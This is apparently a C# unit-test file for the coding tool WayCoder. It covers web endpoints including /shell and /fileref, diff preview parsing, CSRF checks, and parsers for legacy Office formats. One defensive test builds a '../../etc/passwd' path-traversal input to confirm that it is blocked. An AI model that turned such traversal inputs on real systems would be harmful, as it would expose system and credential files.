            Check("WebCmd: POST /command /interrupt 处理", interruptResp.Content.ReadAsStringAsync().Result.Contains("\"handled\":true"));

            var missingResp = client.PostAsync(baseUrl + "/command",
                new StringContent("{}", Encoding.UTF8, "application/json")).Result;
            Check("WebCmd: POST /command 缺 input 报错", missingResp.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));
        }
        catch { Check("WebCmd: 端点冒烟", false); }
        finally { web.Stop(); }

        // ── 3. HTML 含斜杠命令路由 ──
        var html = WayCoder.UI.Web.WebAssets.Html;
        Check("WebCmd: HTML 含 handleUiCommand", html.Contains("function handleUiCommand"));
        Check("WebCmd: HTML 含 /command 路由", html.Contains("/command"));
        Check("WebCmd: HTML 含 cmd 样式", html.Contains(".msg.cmd"));
    }

    /// <summary>Web 特殊前缀输入 + 中间格式渲染：SerializeFileList 纯函数 + /test 分支 + /shell//fileref//filelist 端点冒烟 + 前端渲染器结构。</summary>
    private static void TestWebPrefixInput(Action<string, bool> Check)
    {
        var a = new Agent(new LLM("test", "sk-test"));

        // ── 1. SerializeFileList 纯函数 ──
        var all = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializeFileList(""));
        Check("Prefix: 空前缀返回 JSON 数组", all?.Kind == JKind.Array);
        if (all != null && all.Kind == JKind.Array)
        {
            Check("Prefix: 条目数 ≤ 40", all.Count <= 40);
            bool shapeOk = true, dirFirst = true;
            var seenFile = false;
            foreach (var it in all.Items)
            {
                var isDir = it.GetBool("isDir");
                var name = it.GetString("name") ?? "";
                if (isDir && !name.EndsWith("/")) shapeOk = false;
                if (!isDir && name.EndsWith("/")) shapeOk = false;
                if (isDir && seenFile) dirFirst = false;
                if (!isDir) seenFile = true;
            }
            Check("Prefix: 目录项带 / 后缀且 isDir 一致", shapeOk);
            Check("Prefix: 目录项排在文件项前", dirFirst);
        }

        var noMatch = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializeFileList("__waycoder_no_such_prefix_xyz__"));
        Check("Prefix: 无匹配前缀返回空数组", noMatch?.Kind == JKind.Array && noMatch.Count == 0);

        // ── 1b. ResolveWithinRoot 路径穿越防护 ──
        var cwd = Directory.GetCurrentDirectory();
        var innerFile = Path.Combine(cwd, "__waycoder_inner__.tmp");
        var inner = WayCoder.UI.Web.WebChatServer.ResolveWithinRoot(innerFile);
        Check("Root: 项目内路径放行", inner != null && Path.GetFullPath(inner!) == Path.GetFullPath(innerFile));
        Check("Root: ../ 穿越返回 null", WayCoder.UI.Web.WebChatServer.ResolveWithinRoot(Path.Combine(cwd, "..", "..", "etc", "passwd")) == null);
        Check("Root: 绝对越界路径返回 null", WayCoder.UI.Web.WebChatServer.ResolveWithinRoot(Path.GetTempPath()) == null);
        Check("Root: 根目录本身放行", WayCoder.UI.Web.WebChatServer.ResolveWithinRoot(cwd) != null);

        // ── 1c. IsCrossSite CSRF 兜底 ──
        Check("CSRF: cross-site 判跨站", WayCoder.UI.Web.WebChatServer.IsCrossSite("cross-site"));
        Check("CSRF: same-origin 非跨站", !WayCoder.UI.Web.WebChatServer.IsCrossSite("same-origin"));
        Check("CSRF: none 非跨站", !WayCoder.UI.Web.WebChatServer.IsCrossSite("none"));
        Check("CSRF: 空头非跨站（curl 放行）", !WayCoder.UI.Web.WebChatServer.IsCrossSite(null));

        // ── 2. HandleCommand /test 中间格式分支 ──
        var (hMarkup, oMarkup) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test markup", a);
        Check("WebTest: /test markup 中间格式", hMarkup && oMarkup.Contains("«red»") && oMarkup.Contains("中间格式"));

        var (hColor, oColor) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test color", a);
        Check("WebTest: /test color 别名=markup", hColor && oColor.Contains("«green»"));

        var (hStyle, oStyle) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test 样式", a);
        Check("WebTest: /test 样式 中文别名", hStyle && oStyle.Contains("«bold»"));

        var (hMid, _) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test 中间", a);
        Check("WebTest: /test 中间 中文别名", hMid);

        var (hTable, oTable) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test table", a);
        Check("WebTest: /test table 对齐冒号", hTable && oTable.Contains("对齐冒号") && oTable.Contains("---:") && oTable.Contains(":---:"));

        var (hTableCn, oTableCn) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test 表格", a);
        Check("WebTest: /test 表格 中文别名", hTableCn && oTableCn.Contains("对齐冒号"));

        var (hList, oList) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test list", a);
        Check("WebTest: /test list 列表", hList && oList.Contains("可用测试项"));

        var (hEmpty, oEmpty) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test", a);
        Check("WebTest: /test 无参=列表", hEmpty && oEmpty.Contains("可用测试项"));

        var (hUnknown, oUnknown) = WayCoder.UI.Web.WebChatServer.HandleCommand("/test blah-xyz", a);
        Check("WebTest: /test 未知提示", hUnknown && oUnknown.Contains("未知测试项"));

        // ── 3. 端点冒烟：/shell //fileref //filelist ──
        var web = new WayCoder.UI.Web.WebChatServer(a, 0);
        web.Start();
        try
        {
            using var client = new HttpClient();
            var baseUrl = $"http://127.0.0.1:{web.Port}";

            var shellBody = JNode.Object().Set("command", "echo hello-prefix").ToJson();
            var shellResp = client.PostAsync(baseUrl + "/shell",
                new StringContent(shellBody, Encoding.UTF8, "application/json")).Result;
            var shellTxt = shellResp.Content.ReadAsStringAsync().Result;
            Check("Prefix: POST /shell 执行回显", shellTxt.Contains("\"ok\":true") && shellTxt.Contains("hello-prefix"));

            var shellBad = client.PostAsync(baseUrl + "/shell",
                new StringContent("{}", Encoding.UTF8, "application/json")).Result;
            Check("Prefix: POST /shell 缺 command 报错", shellBad.Content.ReadAsStringAsync().Result.Contains("\"ok\":false"));

            var flResp = client.PostAsync(baseUrl + "/filelist",
                new StringContent(JNode.Object().Set("prefix", "").ToJson(), Encoding.UTF8, "application/json")).Result;
            var flTxt = flResp.Content.ReadAsStringAsync().Result;
            Check("Prefix: POST /filelist 返回 files 数组", flTxt.Contains("\"ok\":true") && flTxt.Contains("\"files\""));

            // 项目内文件可读，项目外文件被路径穿越防护拒绝
            var tmpIn = Path.Combine(Directory.GetCurrentDirectory(), "__waycoder_ref_test__.tmp");
            File.WriteAllText(tmpIn, "file-ref-content-123");
            var frResp = client.PostAsync(baseUrl + "/fileref",
                new StringContent(JNode.Object().Set("path", tmpIn).ToJson(), Encoding.UTF8, "application/json")).Result;
            var frTxt = frResp.Content.ReadAsStringAsync().Result;
            Check("Prefix: POST /fileref 读取注入", frTxt.Contains("\"ok\":true") && frTxt.Contains("file-ref-content-123"));
            File.Delete(tmpIn);

            var tmpOut = Path.GetTempFileName();
            File.WriteAllText(tmpOut, "outside-root");
            var frEscape = client.PostAsync(baseUrl + "/fileref",
                new StringContent(JNode.Object().Set("path", tmpOut).ToJson(), Encoding.UTF8, "application/json")).Result;
            var frEscapeTxt = frEscape.Content.ReadAsStringAsync().Result;
            Check("Prefix: POST /fileref 越界拒绝", frEscapeTxt.Contains("\"ok\":false") && frEscapeTxt.Contains("项目根目录"));
            File.Delete(tmpOut);
        }
        catch { Check("Prefix: 端点冒烟", false); }
        finally { web.Stop(); }

        // ── 4. 前端渲染器结构（markupToHtml / ansiToHtml / splitRow / 表格对齐）──
        var html = WayCoder.UI.Web.WebAssets.Html;
        Check("Prefix: HTML 含 markupToHtml", html.Contains("function markupToHtml"));
        Check("Prefix: HTML 含 ansiToHtml", html.Contains("function ansiToHtml"));
        Check("Prefix: HTML 含 splitRow", html.Contains("function splitRow"));
        Check("Prefix: HTML 含 MARKUP_STYLES", html.Contains("MARKUP_STYLES"));
        Check("Prefix: HTML 含表格对齐 text-align", html.Contains("text-align:"));
    }

    /// <summary>Web Diff 预览：ParseDiffAnswer/SerializeHunks 纯函数 + DiffPreview.Show Web 分支。</summary>
    private static void TestWebDiffPreview(Action<string, bool> Check)
    {
        // ── 1. ParseDiffAnswer 纯函数 ──
        var acc = WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("{\"decision\":\"accept\"}");
        Check("WebDiff: accept → AcceptAll", acc != null && acc.Decision == DiffPreview.Decision.AcceptAll && acc.AcceptedHunks == null);

        var rej = WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("{\"decision\":\"reject\"}");
        Check("WebDiff: reject → RejectAll", rej != null && rej.Decision == DiffPreview.Decision.RejectAll);

        var part = WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("{\"decision\":\"partial\",\"accepted\":[0,2]}");
        Check("WebDiff: partial → Partial + 索引集", part != null && part.Decision == DiffPreview.Decision.Partial
            && part.AcceptedHunks != null && part.AcceptedHunks.SetEquals(new HashSet<int> { 0, 2 }));

        var partEmpty = WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("{\"decision\":\"partial\",\"accepted\":[]}");
        Check("WebDiff: partial 空集", partEmpty != null && partEmpty.Decision == DiffPreview.Decision.Partial
            && partEmpty.AcceptedHunks != null && partEmpty.AcceptedHunks.Count == 0);

        Check("WebDiff: null → null", WayCoder.UI.Web.WebChatServer.ParseDiffAnswer(null) == null);
        Check("WebDiff: 空串 → null", WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("") == null);
        Check("WebDiff: 非法 JSON → null", WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("not json") == null);
        Check("WebDiff: 未知 decision → RejectAll", WayCoder.UI.Web.WebChatServer.ParseDiffAnswer("{\"decision\":\"huh\"}")?.Decision == DiffPreview.Decision.RejectAll);

        // ── 2. SerializeHunks 纯函数 ──
        var hunks = DiffPreview.BuildHunks("line1\nline2\n", "line1\nCHANGED\nline2\n");
        Check("WebDiff: BuildHunks 产出 hunk", hunks.Count >= 1);
        var hunksNode = Json.Parse(WayCoder.UI.Web.WebChatServer.SerializeHunks(hunks));
        Check("WebDiff: SerializeHunks 是数组", hunksNode?.Kind == JKind.Array);
        bool hunkValid = hunksNode != null && hunksNode.Kind == JKind.Array && hunksNode.Items.Any();
        if (hunkValid)
        {
            var first = hunksNode!.Items.First();
            Check("WebDiff: hunk 含 header", first["header"] != null);
            Check("WebDiff: hunk 含 lines 数组", first["lines"]?.Kind == JKind.Array);
            bool hasDelOrAdd = first["lines"]!.Items.Any(l => l["kind"]?.AsString() == "-" || l["kind"]?.AsString() == "+");
            Check("WebDiff: hunk 行含 +/- 标记", hasDelOrAdd);
        }
        else Check("WebDiff: hunk 结构有效", false);

        // ── 3. DiffPreview.Show Web 分支（mock 桥，不阻塞 Console）──
        var mock = new MockInteraction();
        UxHelper.WebInteraction = mock;
        try
        {
            var old = "a\nb\nc\n";
            var nw = "a\nB\nc\n";

            mock.DiffResult = new DiffConfirmResult { Decision = DiffPreview.Decision.AcceptAll };
            var r = DiffPreview.Show(old, nw, "test.cs");
            Check("WebDiff: Show 走 Web 桥 AcceptAll", r.Decision == DiffPreview.Decision.AcceptAll);
            Check("WebDiff: Show 调用 DiffConfirmAsync", mock.DiffCalled);

            mock.DiffResult = new DiffConfirmResult { Decision = DiffPreview.Decision.Partial, AcceptedHunks = new HashSet<int> { 0 } };
            var rp = DiffPreview.Show(old, nw, "test.cs");
            Check("WebDiff: Show Partial 返回索引集", rp.Decision == DiffPreview.Decision.Partial
                && rp.AcceptedHunks != null && rp.AcceptedHunks.SetEquals(new HashSet<int> { 0 }));

            mock.DiffResult = null;
            var rn = DiffPreview.Show(old, nw, "test.cs");
            Check("WebDiff: Show null（取消/超时）→ RejectAll", rn.Decision == DiffPreview.Decision.RejectAll);

            // 无实际变更时即使 Web 桥存在也应直接放行（不弹框）
            mock.DiffCalled = false;
            var rSame = DiffPreview.Show(old, old, "test.cs");
            Check("WebDiff: 无变更直接放行且不弹框", rSame.Decision == DiffPreview.Decision.AcceptAll && !mock.DiffCalled);
        }
        finally { UxHelper.WebInteraction = null; }
    }

    private static void TestWebUpload(Action<string, bool> Check)
    {
        // ── 1. ParseUploadKind 纯函数 ──
        Check("WebUp: kind=image → image", WayCoder.UI.Web.WebChatServer.ParseUploadKind("kind=image") == "image");
        Check("WebUp: kind=audio → audio", WayCoder.UI.Web.WebChatServer.ParseUploadKind("kind=audio") == "audio");
        Check("WebUp: 大小写不敏感 → image", WayCoder.UI.Web.WebChatServer.ParseUploadKind("kind=IMAGE") == "image");
        Check("WebUp: 非法 kind → null", WayCoder.UI.Web.WebChatServer.ParseUploadKind("kind=huh") == null);
        Check("WebUp: 缺少 kind → null", WayCoder.UI.Web.WebChatServer.ParseUploadKind("a=1") == null);
        Check("WebUp: null → null", WayCoder.UI.Web.WebChatServer.ParseUploadKind(null) == null);
        Check("WebUp: 空串 → null", WayCoder.UI.Web.WebChatServer.ParseUploadKind("") == null);

        // ── 2. IsImageExtension 纯函数 ──
        Check("WebUp: png 是图片", WayCoder.UI.Web.WebChatServer.IsImageExtension("png"));
        Check("WebUp: .jpg 是图片", WayCoder.UI.Web.WebChatServer.IsImageExtension(".jpg"));
        Check("WebUp: JPG 是图片", WayCoder.UI.Web.WebChatServer.IsImageExtension("JPG"));
        Check("WebUp: txt 非图片", !WayCoder.UI.Web.WebChatServer.IsImageExtension("txt"));
        Check("WebUp: 空非图片", !WayCoder.UI.Web.WebChatServer.IsImageExtension(""));

        // ── 3. SafeExtension 纯函数 ──
        Check("WebUp: a.png → png", WayCoder.UI.Web.WebChatServer.SafeExtension("a.png", "image") == "png");
        Check("WebUp: a.PNG → png", WayCoder.UI.Web.WebChatServer.SafeExtension("a.PNG", "image") == "png");
        Check("WebUp: .JPG → jpg", WayCoder.UI.Web.WebChatServer.SafeExtension(".JPG", "image") == "jpg");
        Check("WebUp: 图片缺扩展回退 png", WayCoder.UI.Web.WebChatServer.SafeExtension("", "image") == "png");
        Check("WebUp: 音频缺扩展回退 bin", WayCoder.UI.Web.WebChatServer.SafeExtension("", "audio") == "bin");
        Check("WebUp: 无扩展回退 png", WayCoder.UI.Web.WebChatServer.SafeExtension("noext", "image") == "png");
        Check("WebUp: 超长扩展回退 png", WayCoder.UI.Web.WebChatServer.SafeExtension("a.verylongextension", "image") == "png");

        // ── 4. IsTranscribeError 纯函数 ──
        Check("WebUp: 错误前缀", WayCoder.UI.Web.WebChatServer.IsTranscribeError("错误：无 API Key"));
        Check("WebUp: 转录失败前缀", WayCoder.UI.Web.WebChatServer.IsTranscribeError("转录失败"));
        Check("WebUp: 转录出错前缀", WayCoder.UI.Web.WebChatServer.IsTranscribeError("转录出错"));
        Check("WebUp: 空文本前缀", WayCoder.UI.Web.WebChatServer.IsTranscribeError("转录返回空文本"));
        Check("WebUp: 正常内容非错误", !WayCoder.UI.Web.WebChatServer.IsTranscribeError("你好，这是转录结果"));
        Check("WebUp: 空串非错误", !WayCoder.UI.Web.WebChatServer.IsTranscribeError(""));

        // ── 5. ParseHttpRequest(byte[]) 二进制正文（RawBody 保留原始字节）──
        var header = Encoding.UTF8.GetBytes("POST /upload?kind=image HTTP/1.1\r\nContent-Length: 4\r\nX-File-Name: a.png\r\n\r\n");
        var raw = new byte[header.Length + 4];
        Array.Copy(header, 0, raw, 0, header.Length);
        raw[header.Length] = 0x89; raw[header.Length + 1] = 0x50; raw[header.Length + 2] = 0x4E; raw[header.Length + 3] = 0x47; // PNG 魔数
        var req = WayCoder.UI.Web.HttpServer.ParseHttpRequest(raw);
        Check("WebUp: 二进制正文 RawBody 长度 4", req != null && req.RawBody.Length == 4);
        Check("WebUp: RawBody 首字节保留 0x89", req != null && req.RawBody[0] == 0x89);
        Check("WebUp: 头解析 X-File-Name", req?.Header("X-File-Name") == "a.png");
        Check("WebUp: Path 为 /upload", req?.Path == "/upload");

        // ── 6. ParsePath 纯函数 ──
        Check("WebUp: ParsePath /upload", WayCoder.UI.Web.HttpServer.ParsePath("POST /upload?kind=image HTTP/1.1\r\nHost: x\r\n\r\n") == "/upload");
        Check("WebUp: ParsePath /chat", WayCoder.UI.Web.HttpServer.ParsePath("POST /chat HTTP/1.1\r\n\r\n") == "/chat");
        Check("WebUp: ParsePath 空", WayCoder.UI.Web.HttpServer.ParsePath("") == "");
    }

    /// <summary>WPS/老式二进制 Office（.wps/.et/.dps/.doc/.xls/.ppt）：CFB 解析器 + DOC/XLS/PPT 文本提取 + 容器识别/RTF/HTML 路由</summary>
    private static void TestWps(Action<string, bool> Check)
    {
        // ── 1. CFB 解析器 round-trip（小流走 mini 链、大流走常规扇区链）──
        var smallData = Encoding.ASCII.GetBytes("Hello Mini Stream!");
        var largeData = new byte[5000];
        for (int i = 0; i < largeData.Length; i++) largeData[i] = (byte)('A' + (i % 26));

        var cfb = BuildCfb(("SmallStream", smallData), ("LargeStream", largeData));
        Check("Wps: CFB 签名识别", CfbParser.IsCfb(cfb));
        Check("Wps: 非 CFB 拒绝", !CfbParser.IsCfb(new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 }));

        var doc = CfbParser.Open(cfb);
        Check("Wps: CFB 解析成功", doc != null);
        if (doc != null)
        {
            var small = doc.GetStream("SmallStream");
            var large = doc.GetStream("LargeStream");
            Check("Wps: 小流（mini 链）字节一致",
                small != null && small.SequenceEqual(smallData));
            Check("Wps: 大流（常规扇区）字节一致",
                large != null && large.SequenceEqual(largeData));
            Check("Wps: 未知名返回 null", doc.GetStream("nope") == null);
            Check("Wps: 流名列表", doc.StreamNames.Contains("SmallStream") && doc.StreamNames.Contains("LargeStream"));
        }

        // ── 2. 容器识别 ──
        Check("Wps: 识别 CFB", LegacyOffice.DetectContainer(cfb) == LegacyOffice.Container.Cfb);
        Check("Wps: 识别 ZIP", LegacyOffice.DetectContainer(new byte[] { 0x50, 0x4B, 0x03, 0x04, 0, 0 }) == LegacyOffice.Container.Zip);
        Check("Wps: 识别 RTF", LegacyOffice.DetectContainer(Encoding.ASCII.GetBytes("{\\rtf1\\ansi hi}")) == LegacyOffice.Container.Rtf);
        Check("Wps: 识别 HTML", LegacyOffice.DetectContainer(Encoding.ASCII.GetBytes("<html><body>x</body></html>")) == LegacyOffice.Container.Html);
        Check("Wps: 识别纯文本", LegacyOffice.DetectContainer(Encoding.UTF8.GetBytes("plain text")) == LegacyOffice.Container.Text);

        // ── 3. 二进制 DOC（FIB + piece table）──
        var docText = ExtractDocDirect();
        Check("Wps: DOC 提取 Hello World", docText.Contains("Hello World"));
        Check("Wps: DOC 提取中文", docText.Contains("第二行"));
        Check("Wps: DOC 压缩文本折半定位", ExtractDocCompressed().Contains("Compressed Hello"));

        // ── 4. 二进制 XLS（BIFF8 SST + LABEL）──
        var xlsText = LegacyOffice.ExtractXls(BuildXlsWorkbook(new[] { "共享字符串一", "shared2" }, "内联标签"));
        Check("Wps: XLS 提取 SST", xlsText.Contains("共享字符串一") && xlsText.Contains("shared2"));
        Check("Wps: XLS 提取 LABEL", xlsText.Contains("内联标签"));
        Check("Wps: XLS 空白表格不 dump 元数据", LegacyOffice.ExtractXls(BuildXlsWorkbookModern(Array.Empty<string>(), false)) == "(XLS 无文本内容)");
        Check("Wps: XLS 加密文件", LegacyOffice.ExtractXls(BuildXlsWorkbookModern(Array.Empty<string>(), true)) == "(XLS 已加密)");

        // ── 5. 二进制 PPT（TextCharsAtom）──
        var pptText = LegacyOffice.ExtractPpt(BuildPptStream("幻灯片标题内容"));
        Check("Wps: PPT 提取文本", pptText.Contains("幻灯片标题内容"));
        Check("Wps: PPT 嵌套容器文本", LegacyOffice.ExtractPpt(BuildPptStreamNested("嵌套容器里的标题")).Contains("嵌套容器里的标题"));
        Check("Wps: PPT 加密分支", LegacyOffice.ExtractPpt(BuildPptStream("x"), encrypted: true) == "(PPT 已加密)");

        // ── 6. RTF 剥离 ──
        var rtfText = LegacyOffice.ExtractRtf("{\\rtf1\\ansi Hello {\\b bold} world \\par second}");
        Check("Wps: RTF 含正文", rtfText.Contains("Hello") && rtfText.Contains("bold") && rtfText.Contains("world"));
        Check("Wps: RTF 剥离控制字", !rtfText.Contains("\\rtf") && !rtfText.Contains("\\par") && !rtfText.Contains("{"));

        // ── 7. 端到端：CFB .wps → read_file ──
        try
        {
            var wpsPath = Path.Combine(Path.GetTempPath(), "wc_test_" + Guid.NewGuid().ToString("N")[..6] + ".wps");
            var wpsCfb = BuildCfb(("WordDocument", BuildDocWordStream("WPS 文档内容")), ("0Table", BuildDocTableStream("WPS 文档内容")));
            File.WriteAllBytes(wpsPath, wpsCfb);
            var readResult = new ReadFileTool().ExecuteAsync(new() { ["file_path"] = wpsPath }).Result;
            Check("Wps: read_file 读 .wps", readResult.Contains("<doc>") && readResult.Contains("WPS 文档内容"));
            File.Delete(wpsPath);
        }
        catch { Check("Wps: read_file 读 .wps", false); }

        // ── 8. 端到端：CFB .ppt 加密检测（headerToken 高 16 位）──
        try
        {
            var encPptPath = Path.Combine(Path.GetTempPath(), "wc_test_" + Guid.NewGuid().ToString("N")[..6] + ".ppt");
            var encCfb = BuildCfb(("PowerPoint Document", BuildPptStream("不应被读取")), ("Current User", BuildPptCurrentUser(true)));
            File.WriteAllBytes(encPptPath, encCfb);
            Check("Wps: PPT 加密检测", LegacyOffice.Extract(encPptPath) == "(PPT 已加密)");

            var plainPptPath = Path.Combine(Path.GetTempPath(), "wc_test_" + Guid.NewGuid().ToString("N")[..6] + ".ppt");
            var plainCfb = BuildCfb(("PowerPoint Document", BuildPptStream("明文标题")), ("Current User", BuildPptCurrentUser(false)));
            File.WriteAllBytes(plainPptPath, plainCfb);
            Check("Wps: PPT 未加密正常提取", LegacyOffice.Extract(plainPptPath).Contains("明文标题"));

            File.Delete(encPptPath);
            File.Delete(plainPptPath);
        }
        catch { Check("Wps: PPT 加密检测", false); }
    }

    private static string ExtractDocDirect()
        => LegacyOffice.ExtractDoc(
            BuildDocWordStream("Hello World\r第二行"),
            BuildDocTableStream("Hello World\r第二行"),
            null);

    private static string ExtractDocCompressed()
        => LegacyOffice.ExtractDoc(
            BuildDocWordStreamCompressed("Compressed Hello"),
            BuildDocTableStreamCompressed("Compressed Hello"),
            null);

    /// <summary>构造最小 WordDocument 流：FIB + UTF-16 文本（piece table 在表流，由 BuildDocTableStream 提供）。</summary>
    private static byte[] BuildDocWordStream(string text)
    {
        const int textOffset = 2048;
        int ccp = text.Length;

        int size = Math.Max(4096, textOffset + ccp * 2 + 4);
        var b = new byte[size];

        W16(b, 0, 0xA5EC);          // wIdent
        // flags @10 = 0（未加密、0Table）
        W16(b, 32, 14);             // csw
        W16(b, 62, 22);             // cslw @ 34 + csw*2 = 62
        W32(b, 76, (uint)ccp);      // ccpText @ fibRgLw[3]，fibRgLwOff=36+csw*2=64 → 64+12=76
        W32(b, 418, 0);             // fcClx @ fibRgFcLcb[33]，fibRgFcLcbOff=64+22*4+2=154 → 154+264=418（表流内偏移 0）
        W32(b, 422, 21);            // lcbClx = 1 + 4 + (2*4) + 8 = 21

        var textBytes = Encoding.Unicode.GetBytes(text);
        Array.Copy(textBytes, 0, b, textOffset, textBytes.Length);
        return b;
    }

    /// <summary>构造最小 WordDocument 流（压缩文本：cp1252 单字节，piece fc 折半定位）。</summary>
    private static byte[] BuildDocWordStreamCompressed(string text)
    {
        const int textOffset = 2048;
        int ccp = text.Length;

        int size = Math.Max(4096, textOffset + ccp + 4);
        var b = new byte[size];

        W16(b, 0, 0xA5EC);
        W16(b, 32, 14);             // csw
        W16(b, 62, 22);             // cslw @ 34 + csw*2
        W32(b, 76, (uint)ccp);      // ccpText @ fibRgLw[3]
        W32(b, 418, 0);             // fcClx → 表流偏移 0
        W32(b, 422, 21);            // lcbClx

        var textBytes = Encoding.ASCII.GetBytes(text);
        Array.Copy(textBytes, 0, b, textOffset, textBytes.Length);
        return b;
    }

    /// <summary>构造最小表流：单 piece 的 piece table（Clx，piece 的 fc 指向 WordDocument 流 textOffset）。</summary>
    private static byte[] BuildDocTableStream(string text)
    {
        const int textOffset = 2048;
        int ccp = text.Length;

        var clx = new byte[21];
        clx[0] = 0x02;              // Pcdt
        W32(clx, 1, 16);            // lcb（PlcPcd 大小 = 4*(n+1)+8*n, n=1 → 16）
        W32(clx, 5, 0);             // CP[0]
        W32(clx, 9, (uint)ccp);     // CP[1]
        // PCD @ offset 13: aCP(2)=0, fc(4)=textOffset, prm(2)=0
        W32(clx, 15, textOffset);   // fc @ pcd+2（非压缩：字节偏移 = fc）
        return clx;
    }

    /// <summary>构造最小表流（压缩 piece：bit30=1，字节偏移 = fc/2，故 fc = 2*textOffset）。</summary>
    private static byte[] BuildDocTableStreamCompressed(string text)
    {
        const int textOffset = 2048;
        int ccp = text.Length;

        var clx = new byte[21];
        clx[0] = 0x02;              // Pcdt
        W32(clx, 1, 16);
        W32(clx, 5, 0);
        W32(clx, 9, (uint)ccp);
        W32(clx, 15, (uint)(textOffset * 2) | 0x40000000u); // 压缩 fc
        return clx;
    }

    /// <summary>构造最小 BIFF8 Workbook 流：SST 共享字符串 + LABEL 内联标签 + EOF。</summary>
    private static byte[] BuildXlsWorkbook(string[] sstStrings, string inlineLabel)
    {
        var body = new MemoryStream();

        var sst = new MemoryStream();
        W32S(sst, sstStrings.Length);
        W32S(sst, sstStrings.Length);
        foreach (var s in sstStrings)
        {
            var bs = BiffString(s);
            sst.Write(bs, 0, bs.Length);
        }
        WriteRecord(body, 0x00FC, sst.ToArray());

        var label = new MemoryStream();
        W16S(label, 0); // row
        W16S(label, 0); // col
        W16S(label, 0); // xf
        var lb = BiffString(inlineLabel);
        label.Write(lb, 0, lb.Length);
        WriteRecord(body, 0x0204, label.ToArray());

        WriteRecord(body, 0x000A, Array.Empty<byte>()); // EOF
        return body.ToArray();
    }

    /// <summary>构造带 BOF(BIFF8) 的 Workbook 流：BOF + 可选 FILEPASS + SST + EOF。</summary>
    private static byte[] BuildXlsWorkbookModern(string[] sstStrings, bool filePass)
    {
        var body = new MemoryStream();

        var bof = new MemoryStream();
        W16S(bof, 0x0600); // BIFF8
        W16S(bof, 0x0005); // dt = workbook globals
        W16S(bof, 0x0DBB); // rupBuild
        W16S(bof, 0x07CC); // rupYear
        W32S(bof, 0x00000041); // bfh
        W32S(bof, 0x00000006); // sfo
        WriteRecord(body, 0x0809, bof.ToArray());

        if (filePass)
            WriteRecord(body, 0x002F, new byte[] { 0x00, 0x00 }); // FILEPASS

        var sst = new MemoryStream();
        W32S(sst, sstStrings.Length);
        W32S(sst, sstStrings.Length);
        foreach (var s in sstStrings)
        {
            var bs = BiffString(s);
            sst.Write(bs, 0, bs.Length);
        }
        WriteRecord(body, 0x00FC, sst.ToArray());

        WriteRecord(body, 0x000A, Array.Empty<byte>()); // EOF
        return body.ToArray();
    }

    private static byte[] BiffString(string s)
    {
        var ms = new MemoryStream();
        W16S(ms, s.Length);
        ms.WriteByte(0x01); // fHighByte（UTF-16）
        var enc = Encoding.Unicode.GetBytes(s);
        ms.Write(enc, 0, enc.Length);
        return ms.ToArray();
    }

    private static void WriteRecord(MemoryStream ms, ushort id, byte[] data)
    {
        W16S(ms, id);
        W16S(ms, data.Length);
        ms.Write(data, 0, data.Length);
    }

    /// <summary>构造最小 PPT 流：单个 TextCharsAtom（UTF-16）。</summary>
    private static byte[] BuildPptStream(string text)
    {
        var ms = new MemoryStream();
        W16S(ms, 0x0000);           // recVer=0 + recInstance=0
        W16S(ms, 0x0FA0);           // RT_TextCharsAtom
        var enc = Encoding.Unicode.GetBytes(text);
        W32S(ms, enc.Length);
        ms.Write(enc, 0, enc.Length);
        return ms.ToArray();
    }

    /// <summary>构造 Current User 流（CurrentUserAtom），headerToken 高 16 位标记是否加密。</summary>
    private static byte[] BuildPptCurrentUser(bool encrypted)
    {
        var ms = new MemoryStream();
        W16S(ms, 0x0000);                          // recVer+recInstance
        W16S(ms, 0x0FF6);                          // CurrentUserAtom
        var atom = new MemoryStream();
        W32S(atom, 20);                            // size
        W32S(atom, encrypted ? 0xF3D1C05Fu : 0xE391C05Fu); // headerToken（高 16 位 0xF3D1=加密）
        W32S(atom, 0);                             // offsetToCurrentEdit
        W16S(atom, 0);                             // lenUserName
        W16S(atom, 0x03F4);                        // docFileVersion
        W16S(atom, 0);                             // unused
        var ab = atom.ToArray();
        W32S(ms, ab.Length);                       // recLen
        ms.Write(ab, 0, ab.Length);
        return ms.ToArray();
    }

    /// <summary>构造嵌套 PPT 流：TextCharsAtom 嵌在容器（recVer=0xF）内部。</summary>
    private static byte[] BuildPptStreamNested(string text)
    {
        var child = new MemoryStream();
        W16S(child, 0x0000); // TextCharsAtom 头
        W16S(child, 0x0FA0);
        var enc = Encoding.Unicode.GetBytes(text);
        W32S(child, enc.Length);
        child.Write(enc, 0, enc.Length);

        var ms = new MemoryStream();
        W16S(ms, 0x000F); // recVer=0xF（容器）+ recInstance=0
        W16S(ms, 0x0F9F); // 容器类型（任意，模拟 Text 容器）
        var cb = child.ToArray();
        W32S(ms, cb.Length);
        ms.Write(cb, 0, cb.Length);
        return ms.ToArray();
    }

    /// <summary>
    /// 构造最小合法 CFB 复合文档（512 字节扇区 / 64 字节 mini 扇区）。
    /// 小流（&lt;4096）进 mini 流 + mini FAT；大流（≥4096）进常规扇区 + FAT。
    /// </summary>
    private static byte[] BuildCfb(params (string name, byte[] data)[] streams)
    {
        const int sectorSize = 512;
        const int miniSectorSize = 64;
        const int headerSize = 512;
        const uint miniCutoff = 4096;

        var mini = streams.Where(s => s.data.Length < miniCutoff).ToArray();
        var regular = streams.Where(s => s.data.Length >= miniCutoff).ToArray();

        // mini 流 + mini FAT
        var miniData = new MemoryStream();
        var miniFat = new List<uint>();
        var miniMeta = new List<(string name, byte[] data, int miniStart, int size)>();
        foreach (var s in mini)
        {
            int cnt = (s.data.Length + miniSectorSize - 1) / miniSectorSize;
            int start = miniFat.Count;
            var padded = new byte[cnt * miniSectorSize];
            Array.Copy(s.data, padded, s.data.Length);
